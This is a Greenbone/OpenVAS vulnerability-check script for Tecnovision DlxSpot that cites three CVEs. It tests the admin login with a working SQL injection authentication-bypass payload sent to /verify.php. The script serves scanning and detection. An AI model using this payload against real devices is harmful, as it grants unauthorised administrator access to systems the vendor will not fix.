CPE = "cpe:/a:tecnovision:dlxspot";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.140378" );
	script_version( "2021-09-10T09:01:40+0000" );
	script_tag( name: "last_modification", value: "2021-09-10 09:01:40 +0000 (Fri, 10 Sep 2021)" );
	script_tag( name: "creation_date", value: "2017-09-20 13:15:09 +0700 (Wed, 20 Sep 2017)" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_tag( name: "severity_vector", value: "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H" );
	script_tag( name: "severity_origin", value: "NVD" );
	script_tag( name: "severity_date", value: "2017-09-29 13:52:00 +0000 (Fri, 29 Sep 2017)" );
	script_cve_id( "CVE-2017-12928", "CVE-2017-12929", "CVE-2017-12930" );
	script_tag( name: "qod_type", value: "exploit" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_name( "Tecnovision DlxSpot Multiple Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2017 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_dlxspot_web_detect.sc" );
	script_mandatory_keys( "dlxspot/installed" );
	script_tag( name: "summary", value: "Tecnovison DlxSpot is prone to multiple vulnerabilities:

  - Hardcoded Root SSH Password (CVE-2017-12928)

  - Arbitrary File Upload to RCE (CVE-2017-12929)

  - Admin Interface SQL Injection (CVE-2017-12930)" );
	script_tag( name: "vuldetect", value: "Sends a crafted HTTP POST request and checks the response." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one." );
	script_xref( name: "URL", value: "https://github.com/unknownpwn/unknownpwn.github.io/blob/master/README.md" );
	exit( 0 );
}
require("host_details.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
url = "/verify.php";
data = "loginusername=admin&loginpassword=x%27+or+%27x%27%3D%27x&save=+LOGIN+";
req = http_post_put_req( port: port, url: url, data: data, add_headers: make_array( "Content-Type", "application/x-www-form-urlencoded" ) );
res = http_keepalive_send_recv( port: port, data: req );
if(ContainsString( res, "src=\"playlist.php\"" ) && ContainsString( res, "<title>Dlxplayer</title>" )){
	report = "It was possible to log in as admin by conducting an SQL injection.";
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

